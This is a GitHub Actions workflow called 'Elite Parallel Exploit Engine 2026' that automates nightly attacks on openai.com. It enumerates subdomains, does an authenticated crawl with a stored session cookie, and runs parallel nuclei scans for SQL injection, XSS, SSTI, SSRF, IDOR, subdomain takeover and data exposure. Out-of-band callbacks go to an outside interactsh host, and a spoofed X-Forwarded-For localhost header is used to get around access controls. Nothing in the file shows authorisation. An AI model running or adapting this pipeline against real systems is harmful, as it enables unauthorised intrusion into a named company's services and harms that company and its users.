name: "Elite Parallel Exploit Engine 2026"

on:
  schedule:
    - cron: '0 0 * * *'
  workflow_dispatch:

permissions:
  contents: write

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Tools
        run: |
          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install -v github.com/projectdiscovery/katana/cmd/katana@latest
          go install -v github.com/projectdiscovery/uncover/cmd/uncover@latest
          echo "$HOME/go/bin" >> $GITHUB_PATH

      - name: Build Target Delta
        env:
          PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
          COOKIE: ${{ secrets.OPENAI_COOKIE }}
        run: |
          # Robust directory and file handling
          mkdir -p output
          
          if [ -f output/params.txt ]; then
            mv output/params.txt output/params_old.txt
          else
            touch output/params_old.txt
          fi
          
          # 1. Cloud-based discovery
          subfinder -d openai.com -all -auth $PDCP_API_KEY -silent > subs.txt
          uncover -q "openai.com" -auth $PDCP_API_KEY -limit 300 >> subs.txt
          cat subs.txt | sort -u | httpx -silent -t 50 -o output/alive.txt
          
          # 2. Authenticated Deep Crawl
          katana -list output/alive.txt -jc -kf all -d 2 -H "Cookie: $COOKIE" -o output/params_new.txt || touch output/params_new.txt
          
          # 3. Delta Logic: Only scan new items to save time
          grep -vFf output/params_old.txt output/params_new.txt > output/to_scan.txt || cp output/params_new.txt output/to_scan.txt
          
          # 4. Persistence Merge
          cat output/params_old.txt output/params_new.txt | sort -u > output/params.txt

      - name: Save Recon Data
        uses: actions/upload-artifact@v4
        with:
          name: targets
          path: output/

  fuzz:
    needs: recon
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        vuln_type: [sqli, xss, ssti, ssrf, idor, takeover, exposure]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/download-artifact@v4
        with:
          name: targets
          path: output/

      - name: Setup Nuclei
        run: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && echo "$HOME/go/bin" >> $GITHUB_PATH

      - name: Parallel Attack Engine
        env:
          ISH_TOKEN: ${{ secrets.INTERACTSH_TOKEN }}
          PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
          COOKIE: ${{ secrets.OPENAI_COOKIE }}
        run: |
          # Using -v for validation to stop false positives
          nuclei -l output/to_scan.txt \
            -tags ${{ matrix.vuln_type }} \
            -auth $PDCP_API_KEY \
            -interactsh-server oast.fun \
            -itoken $ISH_TOKEN \
            -header "Cookie: $COOKIE" \
            -header "X-Forwarded-For: 127.0.0.1" \
            -rate-limit 120 \
            -o output/hit_${{ matrix.vuln_type }}.txt

      - name: Atomic Save Findings
        run: |
          git config --local user.email "bot@hacker.ai"
          git config --local user.name "Exploit-Bot"
          # Retry loop handles 7 jobs pushing to Git at once
          for i in {1..10}; do
            git pull origin main --rebase
            git add output/
            git commit -m "Vuln-Hit: ${{ matrix.vuln_type }} $(date)" && git push origin main && break || sleep 15
          done
          
